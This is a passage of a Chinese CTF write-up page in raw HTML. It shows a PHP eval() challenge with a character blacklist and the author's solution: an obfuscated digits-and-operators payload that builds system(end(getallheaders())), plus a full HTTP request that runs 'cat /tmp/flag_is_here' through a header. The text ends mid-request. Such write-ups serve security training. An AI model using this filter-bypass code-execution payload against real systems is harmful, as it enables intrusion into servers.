class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> (substr(md5($_GET[<span class="hljs-string">&#x27;pass&#x27;</span>]), <span class="hljs-number">0</span>, <span class="hljs-number">6</span>) === <span class="hljs-string">&quot;7b6db2&quot;</span>) &#123;<br>        $str = $_POST[<span class="hljs-string">&#x27;code&#x27;</span>];<br>        $butaixing = [<span class="hljs-string">&#x27;[a-z]&#x27;</span>,<span class="hljs-string">&#x27;\+&#x27;</span>, <span class="hljs-string">&#x27;[\x7f-\xff]&#x27;</span>, <span class="hljs-string">&#x27;~&#x27;</span>, <span class="hljs-string">&#x27;%&#x27;</span>,<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;;&#x27;</span>,<span class="hljs-string">&#x27;\s&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>, <span class="hljs-string">&#x27;\$&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>, <span class="hljs-string">&#x27;\^&#x27;</span>, <span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-string">&#x27;#&#x27;</span>,<span class="hljs-string">&#x27;!&#x27;</span>,<span class="hljs-string">&#x27;&lt;&#x27;</span>,<span class="hljs-string">&#x27;&gt;&#x27;</span>];<br>        <span class="hljs-comment">// 没过滤 () . ? 数字 &#123;&#125;  / @ -  _</span><br>        <span class="hljs-keyword">foreach</span> ($butaixing <span class="hljs-keyword">as</span> $item) &#123;<br>            <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . $item . <span class="hljs-string">&#x27;/im&#x27;</span>, $str)) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;臭弟弟，你想干啥？&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span> . $str . <span class="hljs-string">&#x27;;&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>这题是 改的RCTF的一题 , 利用一些神奇的操作获得字母</p></blockquote><p>直接给出payload，后期单独总结</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima"># <span class="hljs-built_in">system</span>(end(getallheaders()))<br>code = ((((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((<span class="hljs-number">2</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))).((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((<span class="hljs-number">2</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((<span class="hljs-number">4</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))).((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)))(((((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))).((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B1</span>%7D)%7C(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B1</span>%7D)).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))))(((((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B1</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((<span class="hljs-number">4</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)))).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((<span class="hljs-number">4</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B1</span>%7D)%7C(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B1</span>%7D))).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((<span class="hljs-number">4</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B1</span>%7D)%7C(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B1</span>%7D))).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B1</span>%7D)%7C(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B1</span>%7D))).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)))).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((<span class="hljs-number">2</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))).(((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D)%7C(((<span class="hljs-number">2</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))<span class="hljs-symbol">%</span><span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%2F0).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B2</span>%7D)%7C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))<span class="hljs-symbol">%</span><span class="hljs-number">7B0</span>%7D))))()))<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">payload</span>:<br><span class="hljs-attribute">POST</span> /?pass=<span class="hljs-number">2708999</span> HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">219.219.61.234:50001</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; WOW<span class="hljs-number">64</span>; rv:<span class="hljs-number">46</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">46</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">DNT</span>: <span class="hljs-number">1</span><br><span class="hljs-attribute">Cookie</span>: PHPSESSID=u<span class="hljs-number">6</span>qctifmhonae<span class="hljs-number">5</span>lp<span class="hljs-number">6</span>h<span class="hljs-number">3</span>n<span class="hljs-number">1</span>e<span class="hljs-number">51</span>ot<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">2106</span><br><span class="hljs-attribute">a</span>: cat /tmp/flag_is_here<br><br><span class="hljs-attribute">code</span>=((((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">2</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))).((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">2</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">4</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))).((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)))(((((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))).((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">1</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>.<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">1</span>%<span class="hljs-number">7</span>D)).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))))(((((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>.<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">1</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">4</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((-<span class="hljs-number">10</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">2</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)))).(((((<span class="hljs-number">1</span>%<span class="hljs-number">2</span>F<span class="hljs-number">0</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D)%<span class="hljs-number">7</span>C(((<span class="hljs-number">4</span>).(<span class="hljs-number">0</span>))%<span class="hljs-number">7</span>B<span class="hljs-number">0</span>%<span class="hljs-number">7</span>D))%<span class="hljs-number">26</span>((((<span class="hljs-number">1</span>%<span 